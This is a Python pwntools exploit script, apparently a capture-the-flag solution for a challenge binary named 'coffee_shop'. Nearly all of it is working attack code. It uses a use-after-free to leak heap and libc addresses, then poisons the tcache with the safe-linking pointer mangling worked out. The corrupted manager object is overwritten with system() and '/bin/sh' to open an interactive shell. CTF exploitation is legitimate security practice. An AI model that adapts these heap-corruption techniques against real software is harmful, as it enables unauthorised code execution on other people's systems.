from pwn import *
context.arch = "amd64"

def file_comp(size, payload):
	io.sendlineafter(b'>', b'4')
	io.sendlineafter(b'contain: ', str(size).encode())
	io.sendlineafter(b'complaint: ', payload)

def revert_comp(index):
	io.sendlineafter(b'>', b'5')
	io.sendlineafter(b'ID:', str(index).encode())

def edit_comp(index, payload):
	io.sendlineafter(b'>', b'6')
	io.sendlineafter(b'ID:', str(index).encode())
	io.sendlineafter(b'(again): ', payload)

def view_comp(index):
	io.sendlineafter(b'>', b'7')
	io.sendlineafter(b'ID:', str(index).encode())


io = process("./coffee_shop")
# io = remote("0.cloud.chals.io", 13624)
if args.GDB:
	gdbscript="""
	c
	"""
	gdb.attach(io, gdbscript=gdbscript)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

# get heap leak
payload = p64(123)
payload += p64(0)*20
payload += p64(0xd1)
payload += random.randbytes(8)*2
file_comp(200, payload)
revert_comp(0)
view_comp(0)
heap_leak = unpack(io.recvline()[:-1], 'all')*0x10
file_comp(200, b'123')
info(f"heap leak: {hex(heap_leak)}")

# get libc leak
file_comp(1100, b'123')
file_comp(1100, b'123')
revert_comp(2)
view_comp(2)
io.recv(1)
libc_leak = unpack(io.recvline()[:-1], 'all')
info(f"libc leak: {hex(libc_leak)}")
libc.address = libc_leak - 0x219ce0
info(f"libc base: {hex(libc.address)}")

# call manager
io.sendlineafter(b'>', b'8')
io.sendlineafter(b'>', b'2')
address = (heap_leak + 0x150) ^ (heap_leak >> 12)
info(f"manager should be at: {hex(heap_leak + 0x150)}")

file_comp(200, b'123') # 4
file_comp(200, b'123') # 5
revert_comp(4)
revert_comp(5)
edit_comp(5, p64(address))

file_comp(200, b'456')
payload = p64(0)*5
payload += p64(libc.sym['system'])
payload += b'/bin/sh\0'
file_comp(200, payload)

binsh = heap_leak + 0x150 + 48
io.sendlineafter(b'>', b'8')
io.sendlineafter(b'>', b'1')
io.sendlineafter(b'item?: ', str(binsh).encode())

io.interactive()
